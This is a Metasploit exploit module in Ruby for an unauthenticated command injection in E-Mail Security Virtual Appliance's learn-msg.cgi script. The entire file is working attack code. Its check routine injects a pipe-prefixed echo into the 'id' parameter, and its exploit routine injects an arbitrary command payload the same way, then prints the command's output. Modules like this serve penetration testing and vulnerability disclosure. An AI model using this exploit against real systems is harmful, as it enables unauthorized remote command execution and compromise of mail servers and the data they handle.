# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "E-Mail Security Virtual Appliance learn-msg.cgi Command Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a command injection vulnerability found in E-Mail Security
                Virtual Appliance. This module abuses the learn-msg.cgi file to execute arbitrary
                OS commands without authentication. This module has been successfully tested on the
                ESVA_2057 appliance.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;iJoo&#039;, # Vulnerability Discovery and PoC
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;EDB&#039;, &#039;20551&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "",
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl python&#039;,
                        }
                },
            &#039;Platform&#039;       => [&#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        =>
                [
                    [&#039;ESVA_2057&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Aug 16 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
 
 
    def check
        clue = Rex::Text::rand_text_alpha(rand(5) + 5)
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "/cgi-bin/learn-msg.cgi",
            &#039;vars_get&#039; => {
                &#039;id&#039; => "|echo #{clue};"
            }
        })
 
        # If the server doesn&#039;t return the default redirection, probably something is wrong
        if res and res.code == 200 and res.body =~ /#{clue}/
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        peer = "#{rhost}:#{rport}"
 
        print_status("#{peer} - Sending Command injection")
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "/cgi-bin/learn-msg.cgi",
            &#039;vars_get&#039; => {
                &#039;id&#039; => "|#{payload.raw};"
            }
        })
 
        # If the server doesn&#039;t return the default redirection, probably something is wrong
        if not res or res.code != 200 or res.body !~ /meta http-equiv="refresh" content="0;URL=\/learned.html"/
            print_error("#{peer} - Probably command not executed, aborting!")
            return
        end
 
        print_good("#{peer} - Command executed successfully")
        print_status("#{peer} - Output: \n#{res.body.split("Learned tokens")[0]}")
    end
 
end



